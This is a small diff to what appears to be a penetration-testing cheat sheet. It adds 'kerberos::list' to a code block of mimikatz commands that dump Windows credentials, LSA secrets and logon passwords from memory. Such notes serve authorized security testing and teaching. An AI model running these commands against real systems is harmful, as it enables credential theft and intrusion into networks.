@@ -352,6 +352,7 @@ mimikatz# vault::cred
 mimikatz# lsadump::lsa /patch
 mimikatz# sekurlsa::dpapi
 mimikatz# sekurlsa::logonpasswords
+mimikatz# kerberos::list
 ```
 
 Dig centrally deployed application:
